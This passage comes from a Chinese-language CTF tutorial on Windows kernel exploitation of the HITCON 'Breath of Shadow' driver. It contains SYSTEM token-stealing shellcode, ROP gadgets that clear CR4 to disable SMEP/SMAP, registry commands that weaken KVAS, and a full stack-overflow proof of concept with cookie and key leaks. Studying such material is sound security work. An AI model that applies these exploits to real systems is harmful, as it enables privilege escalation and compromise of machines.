    而 ```Process``` 欄位就是其 ```_EPROCESS``` 中 ```Pcb``` 的指標了 !
    
    我們來整理一下整個流程，然後開始寫 shell code:
    
    ![ref5](https://lompandi.github.io/posts/post3/imgs/fetching_eprocess.png)
    
    1. 由讀取 gs:[0x188] (計算過程```Prcb 的偏移量 + CurrentThread 欄位的偏移量 = 0 + 0x180 + 0x8 = 0x188```) 得到 CurrentThread 的指標。
    2. 由讀取 CurrentThread + 0xb8 ```ApcState 偏移量 + Process 偏移量 = 0x98 + 0x20 = 0xb8``` 得到 Process 指標，並且由其找到 _EPROCESS 中的 Pcb 欄位 (偏移量 0x0)，也就是 _EPROCESS 的位址了。    
    
    上述流程轉換成組合語言如下:
    
    ```
    mov rdx, gs:[0x188]     ; 0x180 + 0x8 = 0x188 -> CurrentThread pointer
    mov rdx, [rdx + 0xb8]   ; 0x98 + 0x20 = 0xb8  -> Process Pointer
    ```
    
    但是，這個 _EPROCESS 結構是目前執行緒的，我們目前還是不知道 system 和 cmd.exe 的 _EPROCESS 結構啊?
    
    沒關係，我們再看一下 _EPROCESS 結構: 
    ```
    kd> dt nt!_EPROCESS
       +0x000 Pcb              : _KPROCESS
       +0x438 ProcessLock      : _EX_PUSH_LOCK
       +0x440 UniqueProcessId  : Ptr64 Void
       +0x448 ActiveProcessLinks : _LIST_ENTRY
       +0x458 RundownProtect   : _EX_RUNDOWN_REF
       +0x460 Flags2           : Uint4B
       [...]
       +0x4b8 Token            : _EX_FAST_REF
    ```
    
    _EPROCESS 中有一個 ```ActiveProcessLinks```，他是一個 doubly linked list 的節點 _LIST_ENTRY，結構很簡單:
    ```c++
    typedef struct _LIST_ENTRY{
        _LIST_ENTRY* Flink;
        _LIST_ENTRY* Blink;
    } LIST_ENTRY;
    ```
    整個串列長得像這樣:
    
    ![ref6](https://lompandi.github.io/posts/post3/imgs/ActiveProcessLink.png)
    
    在這裡 Flink 會指向下一個 EPROCESS 的 ActiveProcessLinks 的 Flink，Blink 則指向上一個 EPROCESS 的 ActiveProcessLinks 的 Flink，這代表我們可以利用這個串列走訪所有 _EPROCESS 結構。
    
    而 _EPROCESS 的另外一個欄位 UniqueProcessId (PID) 位址即為 ```Flink 欄位的位址 - 8```，這代表如果我們讀取每個 Flink 的位址 - 8 的值，就可以一邊走一邊比對 PID 來找尋 system 和 cmd.exe 的 _EPROCESS 結構了。

    ![ref7](https://lompandi.github.io/posts/post3/imgs/fetching_eprocess%20final.png)

    接下來，我們先著手完成 shellcode 吧!
    
    ```
    mov rdx, gs:[0x188]     ; 0x180 + 0x8 = 0x188 -> CurrentThread pointer
    mov rdx, [rdx + 0xb8]   ; 0x98 + 0x20 = 0xb8  -> Process Pointer
    mov r9,  [rdx + 0x448]  ; EPROCESS + 0x448 -> Flink address field
    mov rcx, r9             ; Flink Address
    
    ; iterate through ActiveProcessLinks to find system process via its pid (4)
    srch_for_sys:
    mov rdx, [rcx - 8]
    cmp rdx, 4
    jz out1
    mov rcx, [rcx]          ; Continue to iterate through ActiveProcessLinks
    jmp srch_for_sys
    
    ;we found system process (pid = 4)
    out1:
    mov rax, [rcx + 0x70]   ; ActiveProcessLinks + 0x70 = Token field address，copy token value to rax
    
    ; iterate through ActiveProcessLinks to find our process via pid
    srch_our_proc:
    mov rdx, [rcx - 8]
    cmp rdx, <our process id>
    jz final
    mov rcx, [rcx]
    jmp srch_our_proc
    
    ; we found our process, modify the token value
    final:
    mov [rcx + 0x70], rax       ;modify the token to system's
    ```
    
    接下來，幫我們遇到可以掌握 Kernel Driver 的 Execution Flow 的場景，就可以用這支小程式提權了!

## IV 核心保護機制和繞過

## IV.1 核心保護
Kernel 做為一個系統中重要的物件，自然不會乖乖站在那邊給你打，Kernel Mode 有一套有別於 User Mode 的保護，最常見的有下列幾項:

* ### SMAP (Supervisor Mode Access Prevention)
由控制暫存 Cr4 中的第 21 個位元控制。若開啟，將**禁止核心模式的程序直接存取所有使用者模式分區的資料**。

* ### SMEP (Supervisor Mode Execution Prevention)
由控制暫存 Cr4 中的第 20 個位元控制。若開啟，將**禁止核心模式的程序執行位於使用者模式分區的代碼**。

* ### KVAS (Kernel Virtual Address Shadow)
核心頁表隔離機制（KVAS）將程序的頁表根據使用者模式和核心模式分割成兩份(即 Shadowing 的概念)，從而有效防止使用者模式透過旁路攻擊竊取核心模式的敏感數據。這一機制在 Windows 10/11 上預設為開啟狀態。

如果開啟KVAS的話，應用程式會有兩個CR3，分別指向 ```PCB.DirectoryTableBase``` 和 ```PCB.UserDirectoryTableBase``` 兩個 PML4 表基底位址。其中 DirectoryTableBase 為核心 PML4 的基底。而三環的Cr3（UserDirectoryTableBase）只映射了核心 KVASCODE 區段的物理頁（少數r3進入r0的入口），而沒有映射其他區段的，因此透過3環的Cr3來尋找核心 TEXT section 的分頁表，**最多只能找到 PPE，從 PDE 開始就沒有被映射了**。

* ### KASLR (Kernel Address Space Layout Randomization)
KASLR 透過隨機變化每次核心模式程序模組載入的基底位址，防止攻擊者透過已知的記憶體位址發起攻擊。這一概念與 ASLR（地址空間佈局隨機化）類似。

## IV.2 關掉核心保護!!!
* ### SMAP、SMEP
    因為這兩項都由 CR4 控制而且沒有寫入保護，故我們只需在**核心模式中**找到類似這樣的 ROP Gadget
    ```
    pop rcx; ret
    ```
    然後給 RCX 一個20跟21位元都為零的值，再使用這個 Gadget
    ```
    mov cr4, rcx; ret 
    ```
    現在 CR4 中 20 和 21 位元的值都為0了，代表我們把 SMEP 和 SMAP 都關掉了。


    (註: AMD 處理器上不能動 CR4 的 Reserved 欄位，不然它會 GPF 然後不會讓你執行 ```mov cr4, rcx```)

* ### KASLR
    和 ASLR 一樣，你需要 Leak 核心模式記憶體中的指標，然後藉由指標去定位程序的基底位址。

* ### KVAS 
    這個對本篇的影響不大，提供一個 CMD 指令腳本 (.cmd) 給大家參考
    ```
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 3 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f
    ```

## V. 範例

這裡使用 HITCON CTF 的題目 [Breath of Shadow](https://github.com/scwuaptx/CTF/tree/master/2019-writeup/hitcon/breathofshadow/challenge) 來示範。

### 1. Setup

題目有一個 BreathofShadow.sys 檔案，它就是 Kernel Driver，我們要讓它在 VM 中運行。

* ### 啟用測試簽署驅動程式
 
首先，在 Windows VM 以管理員身分執行 CMD，並輸入 ```bcdedit /set testsigning on```

![ref11](https://lompandi.github.io/posts/post3/imgs/opents.png)

不這樣做的話它會禁止所有沒有簽章的 Kernel Driver 運行。

(註: 如果 Secure Boot 有開的話，記得關掉，否則無法啟用測試簽署驅動程式)

* ### 註冊驅動程式

在剛剛的 CMD 中輸入 ```sc create BreathofShadow type=kernel binPath=<BreathofShadow.sys 的檔案路徑> start=auto```

![ref12](https://lompandi.github.io/posts/post3/imgs/sc.png)

```start=auto``` 是讓它每次開機自動啟動，如果想手動啟動的話，就不需指定該參數。

* ### 啟動驅動程式

在剛剛的 CMD 中輸入 ```sc start BreathofShadow```

![ref13](https://lompandi.github.io/posts/post3/imgs/sdr.png)

現在 Kernel Driver 已經成功運行了。

### 2. 開始遠端偵錯
在實體機上，把 kd 連接上 VM，然後按 ```Ctrl-C``` 中斷執行。

```
C:\Users\USER>kd -k net:port=50000,key=p.a.s.s,target=192.168.1.105

Microsoft (R) Windows Debugger Version 10.0.19041.685 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

Using NET for debugging
Opened WinSock 2.0
Using IPv4 only.
Kernel Debug Target Status: [no_debuggee]; Retries: [0] times in last [7] seconds.
Waiting to reconnect...
Connected to target 192.168.1.105 on port 50000 on local IP 192.168.1.105.
You can get the target MAC address by running .kdtargetmac command.
Connected to Windows 10 19041 x64 target at (Thu Feb  6 13:33:54.647 2025 (UTC + 8:00)), ptr64 TRUE
Kernel Debugger connection established.
Symbol search path is: srv*
Executable search path is:
Windows 10 Kernel Version 19041 MP (1 procs) Free x64
Product: WinNt, suite: TerminalServer SingleUserTS Personal
Built by: 19041.1.amd64fre.vb_release.191206-1406
Machine Name:
Kernel base = 0xfffff803`78400000 PsLoadedModuleList = 0xfffff803`7902a770
Debug session time: Thu Feb  6 13:33:53.754 2025 (UTC + 8:00)
System Uptime: 0 days 0:09:20.555
Break instruction exception - code 80000003 (first chance)
*******************************************************************************
*                                                                             *
*   You are seeing this message because you pressed either                    *
*       CTRL+C (if you run console kernel debugger) or,                       *
*       CTRL+BREAK (if you run GUI kernel debugger),                          *
*   on your debugger machine's keyboard.                                      *
*                                                                             *
*                   THIS IS NOT A BUG OR A SYSTEM CRASH                       *
*                                                                             *
* If you did not intend to break into the debugger, press the "g" key, then   *
* press the "Enter" key now.  This message might immediately reappear.  If it *
* does, press "g" and "Enter" again.                                          *
*                                                                             *
*******************************************************************************
nt!DbgBreakPointWithStatus:
fffff803`78806e40 cc              int     3
kd>
```
輸入 ```.reload``` 刷新程序模組清單
```
kd> .reload
Connected to Windows 10 19041 x64 target at (Thu Feb  6 13:35:18.706 2025 (UTC + 8:00)), ptr64 TRUE
Loading Kernel Symbols
...............................................................
................................................................
..................................................
Loading User Symbols

Loading unloaded module list
.......
```
接下來輸入 ```lm m BreathofShadow``` 來查看 Kernel Driver 
```
kd> lm m BreathofShadow
start             end                 module name
fffff803`8fd40000 fffff803`8fd48000   BreathofShadow   (deferred)
```
這樣就確認完畢了。

### 3. 逆向工程 (使用 IDA Freeware 8.3)

在 BreathofShadow.sys 中，可以看到幾個 Functions，其中有一個 DriverEntry，這就是驅動程式的進入點，就像 exe 中的 main 一樣，將它反編譯:

```c++
__int64 __fastcall DriverEntry(_QWORD *a1)
{
  _security_init_cookie();
  return sub_140006000(a1);
}
```

它叫了另外一個起始函數 ```sub_140006000```，將它反編譯:

```c++
__int64 __fastcall sub_140006000(_QWORD *a1)
{
  int v2; // edi
  const char *v3; // rcx
  unsigned __int64 v4; // rbx
  ULONG v5; // eax
  char v7; // [rsp+28h] [rbp-40h]
  struct _UNICODE_STRING v8; // [rsp+40h] [rbp-28h] BYREF
  struct _UNICODE_STRING v9; // [rsp+50h] [rbp-18h] BYREF
  __int64 v10; // [rsp+80h] [rbp+18h] BYREF

  v10 = 0i64;
  RtlInitUnicodeString(&v8, L"\\Device\\BreathofShadow");
  v7 = 0;
  v2 = IoCreateDevice(a1, 0i64, &v8, 34i64, 256, v7, &v10);
  if ( v2 >= 0 )
  {
    a1[14] = sub_140005110;
    a1[16] = sub_140005110;
    a1[28] = sub_140005130;
    a1[13] = sub_1400051C0;
    RtlInitUnicodeString(&v9, L"\\DosDevices\\BreathofShadow");
    v2 = IoCreateSymbolicLink(&v9, &v8);
    if ( v2 < 0 )
    {
      DbgPrint(aCouldnTCreateS);
      IoDeleteDevice(v10);
    }
    *(_DWORD *)(v10 + 48) |= 0x10u;
    *(_DWORD *)(v10 + 48) &= ~0x80u;
    Seed = KeQueryTimeIncrement();
    v4 = (unsigned __int64)RtlRandomEx(&Seed) << 32;
    v5 = RtlRandomEx(&Seed);
    v3 = "Enable Breath of Shadow Encryptor\n";
    qword_140003018 = v4 | v5;
  }
  else
  {
    _mm_lfence();
    v3 = "Couldn't create the device object\n";
  }
  DbgPrint(v3);
  return (unsigned int)v2;
}
```
這裡使用 [IoCreateDevice](https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice) 建立驅動裝置物件，其中 ```a1``` 是一個 PDRIVER_OBJECT，會由 IoCreateDevice 建立後回傳，而 ```v8``` 則是裝置名稱，用於建立與之關聯的任意訪問控制清單（DACL）。

接下來，如果裝置建立成功的話，它會建立 [PDRIVER_OBJECT](https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object) 中 MajorFunction 的函數進入點，裡面包含如何退出，如何處理資料等自定義的函數。

接下來它使用 [IoCreateSymbolicLink](https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatesymboliclink) 來建立與裝置使用者之間的符號連結。

這裡要來說一下甚麼是 Symbolic Link。一開始在 IoCreateDevice 時傳入的 DeviceName "\\\\Device\\\\BreathofShadow" 只能在核心模式中使用，若要在**使用者模式中訪問驅動裝置就需要 Symbolic Link 來做連結**。

例如，C 硬碟的符號連結名稱是 ``C:``，對應的設備名稱是 ```\Device\HarddiskVolume1```。在驅動程式中，裝置物件名稱需以 ```L"\\Device\\"``` 開頭，其中 "L" 表示字串使用 Unicode 編碼（wchar_t）。而符號連結名稱則需以 ```L"\\DosDevices\\"``` 或 ```L"\\??\\"``` 開頭。

接下來，函數生成一個隨機值並將其賦值到一個全域變數。

接下來裝置初始化完成，我們來找一下他 PDRIVER_OBJECT 中 MajorFunction 的主要處理函數。

翻一下後，發現 ```sub_140005130``` 是其處理資料請求的主要函數(幫大家重新命名所有欄位):

```c++
NTSTATUS sub_140005130(__int64 a1, PIRP pIrp)
{
  NTSTATUS status; // edi
  PIO_STACK_LOCATION  CurrentIrpStackLocation; // rax
  __int64 _CurrentIrpStackLocation; // rsi

  status = STATUS_NOT_SUPPORTED;
  CurrentIrpStackLocation = IoGetCurrentIrpStackLocation(pIrp);
  _CurrentIrpStackLocation = CurrentIrpStackLocation;
  if ( CurrentIrpStackLocation )
  {
    if (CurrentIrpStackLocation->DeviceIoControl.IoControlCode == 0x9C40240B)
    {
      DbgPrint(aBreathOfShadow);
      status = EncryptionFunction(pIrp, _CurrentIrpStackLocation);
    }
    else
    {
      DbgPrint("Invalid\n");
      status = STATUS_INVALID_DEVICE_REQUEST;
    }
  }
  pIrp->Information = NULL;
  pIrp->Status = status;
  IofCompleteRequest(pIrp, NULL);
  return status;
}
```

他會呼叫一個 ```EncryptionFunction```(已重新命名)

```c++
NTSTATUS EncryptionFunction(PIRP pIrp, PIO_STACK_LOCATION CurrentIoStackLocation)
{
  void *InputBuffer; // rdi
  unsigned __int64 InputSize; // rsi
  size_t OutputBufferSize; // r14
  int i; // ecx
  char Dst[256]; // [rsp+30h] [rbp-128h] BYREF

  InputBuffer = CurrentIoStackLocation->DeviceIoControl.Type3InputBuffer;
  InputSize = CurrentIoStackLocation->DeviceIoControl.InputBufferLength;
  OutputBufferSize = CurrentIoStackLocation->DeviceIoControl.OutputBufferLength;
  if ( !InputBuffer )
    return STATUS_UNSUCCESSFUL;
  memset(Dst, 0i64, 0x100ui64);
  ProbeForRead(InputBuffer, 256i64, 1i64);
  memcpy_0(Dst, InputBuffer, (unsigned int)InputSize);
  for ( i = 0; i < InputSize >> 3; ++i )
    Dst[i] ^= qword_140003018;
  ProbeForWrite(InputBuffer, 256i64, 1i64);
  memcpy_0(InputBuffer, Dst, OutputBufferSize);
  return 0i64;
}
```

在 ```EncryptionFunction```，它會讀取來自使用者的 InputBuffer，將其拷貝到一個位於核心模式分區中大小為 256 個 bytes 的緩衝區內，將其和初始化時產生的隨機值作 XOR 運算，並將其回傳使用者的緩衝區中。其中 ```ProbeForRead``` 和 ```ProbeForWrite``` 是用來檢查傳入的指標是否位於使用者模式分區中，避免有人直接傳入核心模式分區中的指標去做 Arbitrary Read/Write。

但是，這裡忽略了大小檢查，意味著我們可以寫入超過256位元組的資料，造成 Buffer Overflow。

### 4. Exploitation Start!

我們首先使用 Windows API 寫一個腳本和 BreathofShadow 驅動程序正常溝通  (C++)

```c++
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <cstdint>
#include <cstdio>

constexpr uint32_t IOCTL_ENCRYPT = 0x9C40240B;

int main()
{
    HANDLE hDevice = CreateFileW(L"\\\\.\\BreathofShadow", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, NULL);
   
    if (hDevice == INVALID_HANDLE_VALUE) {
        puts("[x] Failed to open driver.\n");
        return 1;
    }
    puts("[*] Successfully opened the driver\n");
    
    DWORD outSize{};
    char original_data[256];
    
    memset(original_data, 'A', sizeof(original_data));
    DeviceIoControl(hDevice, IOCTL_ENCRYPT, original_data, sizeof(original_data), NULL, 256, &outSize, NULL);
}
```

接著，在 kd 中，於 EncryptionFunction 的兩次 memcpy 各設一個中斷點來觀察IOCTL時的緩衝區變化的情況:
```
kd> bp BreathofShadow+506F
kd> bp BreathofShadow+50BA
```
然後編譯並運行腳本。

操作示範:

<video width="640" height="360" controls>
  <source src="https://lompandi.github.io/posts/post3/vids/save.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

第一次memcpy前:
```
Breakpoint 0 hit
BreathofShadow+0x506f:
fffff800`1fad506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
kd> db rcx L50
ffff950a`a640d690  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff950a`a640d6a0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff950a`a640d6b0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff950a`a640d6c0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffff950a`a640d6d0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
kd> db rdx L50
00000090`c2b9f630  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f640  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f650  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f660  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f670  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
kd> r r8
r8=0000000000000100
kd> g
```
可以看到 RDX 指向的資料 (使用者傳入的 Buffer) 中有我們設定的 A 字元，而 RCX 指向的資料 (核心中的 Buffer) 則是清空的狀態，並且 R8 是我們透過 DeviceIoControl 傳入的 InputSize 256。

第二次memcpy前:
```
Breakpoint 1 hit
BreathofShadow+0x50ba:
fffff800`1fad50ba e8c1c0ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
kd> db rcx L50
00000090`c2b9f630  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f640  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f650  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f660  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000090`c2b9f670  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
kd> db rdx L50
ffff950a`a640d690  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
ffff950a`a640d6a0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
ffff950a`a640d6b0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
ffff950a`a640d6c0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
ffff950a`a640d6d0  c6 4e 90 37 ad 5d c0 63-c6 4e 90 37 ad 5d c0 63  .N.7.].c.N.7.].c
kd> r r8
r8=0000000000000100
kd> g
```
RDX 指向的資料 (核心中的 Buffer) 中有 XOR 後的資料，這將會被拷貝到使用者傳入的 Buffer中，而 R8 是我們透過 DeviceIoControl 傳入的 OutputSize 256。

理解它的套路以後就可以來寫 POC 了，首先我們來抓 XOR Key，可以先傳入一個值，再將 XOR 回傳的結果與原值做 XOR，這樣就能得到 XOR Key: 

```c++
uintptr_t xor_key = 0x4141414141414141;
DeviceIoControl(hDevice, IOCTL_ENCRYPT, &xor_key, 8, NULL, 8, &outSize, NULL);
xor_key ^= 0x4141414141414141;
printf("Encryption key: 0x%llx\n");
```

```
Encryption key: 0x22811cec`76d10f87
```
確認一下:
```
kd> dq BreathofShadow+3018 L1
fffff800`1fad3018  22811cec`76d10f87
```

接下來，我們要看一下我們的資料寫入核心前後時的堆疊布局，再進行 ROP。
* **複製前**

```
Breakpoint 0 hit
BreathofShadow+0x506f:
fffff800`1fad506f e80cc1ffff      call    BreathofShadow+0x1180 (fffff800`1fad1180)
kd> dq rcx L35
ffff950a`a6efb690  00000000`00000000 00000000`00000000
ffff950a`a6efb6a0  00000000`00000000 00000000`00000000
[...]
ffff950a`a6efb780  00000000`00000000 00000000`00000000
ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
ffff950a`a6efb810  00000000`00000000 00000000`00000001
ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
ffff950a`a6efb830  00000000`00000001
```
* **複製後**
```
kd> p
BreathofShadow+0x5074:
fffff800`1fad5074 8bcb            mov     ecx,ebx
kd> dq rcx L35
ffff950a`a6efb690  41414141`41414141 41414141`41414141
ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
[...]
ffff950a`a6efb780  41414141`41414141 41414141`41414141
ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
ffff950a`a6efb810  00000000`00000000 00000000`00000001
ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
ffff950a`a6efb830  00000000`00000001
```
使用```k``` 來查看 backtrace，並尋找 return address 在哪裡。
```
kd> k
Child-SP          RetAddr           Call Site
ffff950a`a6efb660 fffff800`1fad518a BreathofShadow+0x5074
ffff950a`a6efb7c0 fffff800`08e35cf5 BreathofShadow+0x518a
ffff950a`a6efb7f0 fffff800`092452ac nt!IofCallDriver+0x55
[...]
kd> s -q ffff950a`a6efb690 L100 BreathofShadow+0x518a
ffff950a`a6efb7b8  fffff800`1fad518a ffff9681`e12fa950
```

所以，return address 就在 0xffff950a\`a6efb7b8，計算一下相對於 InputBuffer 的偏移量 0xffff950a\`a6efb7b8 -  ffff950a\`a6efb690 = 0x128 = 296。所以，如果我們傳入296個 bytes 的資料再加上一段位址，函式回傳時就會嘗試執行那段位址的資料。但是，這裡的堆疊有 stack cookie，這是一個隨機值。函數執行結束時，程式會檢查堆疊中的 stack cookie 值是否改變。如果 stack cookie 被改動（通常是因為緩衝區溢位篡改了它），程式會發現這一點並停止執行，避免繼續執行被破壞的程式碼，這代表我們必須要洩漏這個值才有可能做 ROP。

要洩漏 stack cookie 也很簡單，我們只需要把 InputSize 調很小然後 OutputSize 調很大，它就會讀到 Buffer 以外的資料了，為了方便，我們先把 Buffer 後面的值全部讀一讀，然後寫入 ROP 時把除了 return address 的值回復就可以了接下來的步驟就和一般 ROP 一樣了:

```
char stack_dump[560];
DeviceIoControl(hDevice, IOCTL_ENCRYPT, stack_dump, 1, NULL, 560, &outSize, NULL);
hexdump(stack_dump+256, 48);

//把它轉換成 qword 方便以後使用
uintptr_t* stack_ptrs = (uintptr_t*)stack_dump;
```

接下來要關掉 SMEP 和 SMAP。要找這兩個 ROP Gadget:
```
pop rcx; ret
mov cr4, rcx; ret
```
我們可以到 ntoskrnl.exe (``C:\Windows\System32\ntoskrnl.exe``) 中找，因為很多 Kernel Driver 的堆疊上都有指向 ntoskrnl.exe 資料的指標，我們的也不例外:

```
kd> p
BreathofShadow+0x5074:
fffff800`1fad5074 8bcb            mov     ecx,ebx
kd> dq rcx L35
ffff950a`a6efb690  41414141`41414141 41414141`41414141
ffff950a`a6efb6a0  41414141`41414141 41414141`41414141
[...]
ffff950a`a6efb780  41414141`41414141 41414141`41414141
ffff950a`a6efb790  ffff273d`af577f8d fffff800`0961a301
ffff950a`a6efb7a0  00000000`00000000 00000000`00000001
ffff950a`a6efb7b0  00000000`c00000bb fffff800`1fad518a
ffff950a`a6efb7c0  ffff9681`e12fa950 ffff9681`e12fa950
ffff950a`a6efb7d0  ffff9681`e12faa20 ffff9681`dad0da70
ffff950a`a6efb7e0  ffff9681`e12fa950 fffff800`08e35cf5
ffff950a`a6efb7f0  00000000`00000002 00000000`00000000
ffff950a`a6efb800  ffff950a`a6efbb80 00000000`00000100
ffff950a`a6efb810  00000000`00000000 00000000`00000001
ffff950a`a6efb820  ffff9681`e12fa950 fffff800`092452ac
ffff950a`a6efb830  00000000`00000001

kd> lm m nt
start             end                 module name
fffff800`08c00000 fffff800`09c46000   nt         (pdb symbols)          C:\ProgramData\dbg\sym\ntkrnlmp.pdb\D9424FC4861E47C10FAD1B35DEC6DCC81\ntkrnlmp.pdb
```

在 ffff950a\`a6efb790 上，有一個指標 fffff800\`0961a301 在 ntoskrnl (nt) 的記憶體範圍內，並且指向 ntoskrnl.exe + 0xA1A301 (偏移值不同版本的機器可能會不太一樣) 所以我們只需要從 stack_dump 中抓這個指標然後扣掉 0xA1A301 就可以得到 ```ntoskrnl.exe``` 的基底，也就是 kernel base 了。

```c++
uintptr_t kernel_base = stack_ptrs[33] - 0xA1A301;
printf("Nt module base at 0x%llx\n", kernel_base);
```

最後是兩個 ROP Gadget 的偏移 :

pop rcx; ret -> ntoskrnl.exe + 0x2148c8

mov cr4, rcx -> ntoskrnl.exe + 0x3A0A87

開始寫 payload 前，記得傳入的位址資料要先與 XOR Key 做 XOR，否則原本的值會被改變:
```c++
#define ADDR(x) ((x) ^ xor_key)
```
建構 Payload:
```c++
uintptr_t payload[74] {};
for(int i = 36; i >= 31; i--){
    payload[i] = ADDR(stack_ptrs[i]);
}

payload[37] = ADDR(kernel_base + 0x2148c8); //pop rcx, ret
payload[38] = ADDR(0x50ef0);
payload[39] = ADDR(kernel_base + 0x3A0A87); //mov cr4, rcx; ret
```
然後把之前得那支提權 shellcode 組譯，這裡推薦 [defuse.ca](https://defuse.ca/online-x86-assembler.htm#disassembly) ，它有支援 C 字串格式的組譯輸出，很方便。
然後把組譯結果放到 POC 中，並且把第 54 和 55 個位元組換成目前的程序的 PID (使用 GetCurrentProcessId)
```c++
char shellcode[] = "\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x92\xB8\x00\x00\x00\x4c\x8B\x8a\x48\x04\x00\x00\x49\x8B\x09\x48\x8B\x51\xF8\x48\x83\xFA\x04\x74\x05\x48\x8B\x09\xEB\xF1\x48\x8B\x41\x70\x24\xF0\x48\x8B\x51\xF8\x48\x81\xFA\x00\x00\x00\x00\x74\x05\x48\x8B\x09\xEB\xEE\x48\x89\x41\x70\xC3";

DWORD pid = GetCurrentProcessId();

shellcode[54] = (char)pid;
shellcode[55] = (char)(pid >> 8);
```
接下來用 VirtualAlloc 來分配一塊擁有 RWE 權限的記憶體，最後把 VirtuAlloc 回傳的位址放到 ROP Chain 裡。(原題解中只有 RW，然後手動用 ASM 秀一波 PML4E 定址然後手動改 XD 位元，我其實不太懂為甚麼要這樣 <span style="font-size: 30px;">🤨</span>)

```c++
PVOID shellcode_addr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(shellcode_addr, shellcode, sizeof(shellcode));

printf("Shellcode at 0x%llx\n", (uintptr_t)shellcode);
payload[40] = ADDR((uintptr_t)shellcode_addr);

DeviceIoControl(device, IOCTL_ENCRYPT, &payload, sizeof(payload), NULL, sizeof(payload), &outSize, NULL); //Send our payload!
```


